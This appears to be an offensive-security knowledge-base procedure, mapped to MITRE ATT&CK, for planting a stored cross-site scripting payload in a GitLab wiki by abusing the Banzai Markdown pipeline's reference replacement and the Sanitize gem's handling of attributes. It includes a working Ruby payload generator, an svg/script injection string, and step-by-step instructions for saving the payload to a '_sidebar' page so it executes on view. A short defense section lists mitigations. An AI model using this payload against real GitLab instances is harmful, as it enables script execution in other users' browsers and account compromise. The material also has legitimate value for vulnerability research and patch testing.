---
tags:
  - xss
  - payload
  - injection
type: procedure
tools:
  - '[[tools/Sanitize]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/generate-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:55.489Z'
sub_techniques: []
id: 1bdcc815-64fc-48fc-b446-37e290ff3877
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Crafted-XSS-Payload-in-Wiki

## Summary

This procedure generates a malicious Markdown payload using Ruby and injects it into a GitLab wiki page, exploiting flaws in the Banzai pipeline to store XSS content that will execute on view.

## Description

The payload crafts nested references and Gollum wiki links like [[a|http:'"<svg>...]] to break quotes and inject HTML. The AbstractReferenceFilter's partial prefix matching causes multiple gsub replacements, inserting unsanitized href into alt attributes. Sanitize gem does not escape filter-generated attributes, allowing injection. Prerequisites include a wiki page ready; outcomes include stored malicious HTML processed on save.

## Requirements

1. Ruby interpreter installed for payload generation
2. Access to the '_sidebar' wiki page editor
3. Knowledge of target issue URL for reference expansion

## Defense

Defensive measures and detection strategies:

- Sanitize all filter-generated attributes with quote escaping
- Implement strict Markdown validation in wiki uploads
- Monitor for suspicious patterns like nested references or &quot; entities

## Objectives

1. Construct payload exploiting reference replacement and quote breaking
2. Store the payload persistently in the wiki
3. Bypass initial sanitization during save

## Instructions

### Step 1: Generate Payload

**Context**: Use Ruby to create the encoded payload incorporating the JS injection.

**Command** ([[commands/generate-xss-payload]]):
```ruby
def gen_payload( payload, based_url:"https://gitlab.com/gitlab-org/gitlab/-/issues/428268")
  payload ="#{payload}#{based_url}"unless payload.include? based_url
  payload = payload.gsub('<','&lt;').gsub('>','&gt;')

  es_payload =%(\<i\><a href="http:#{ payload.gsub('"','&quot;')}" class="gfm">a</a></i>)
  es_payload =CGI.escape_html( es_payload ).gsub('%20','%2520')

  a =%(\<dl\><a href="#{ based_url }#{ es_payload }">#{ based_url }\*<i>\[[a|http:#{ payload }]\]</i></a></dl>)
  puts a
end

gen_payload %('"><svg><style>dl{visibility:hidden}<i/class=gl-show-field-errors><input/title="<script>alert(document.domain)</script>"/></style></svg>')
```

> This outputs a Markdown string with nested <a> tags and references. The payload uses &quot; to break alt attributes and injects <svg><style><img src=... onerror=alert(document.domain)> via HTML5 parsing tolerance for '/' separators.

### Step 2: Insert and Save

**Context**: Paste the generated payload into the wiki content.

Set the content field to the output from Step 1, title to '_sidebar', and click 'Create page'.

**Expected Output**: Page saves; Banzai processes Markdown, applying multiple replacements without immediate JS execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/generate-xss-payload]]

## Tools Used

- [[tools/Sanitize]]

## Tags

- [[xss]]
- [[injection]]
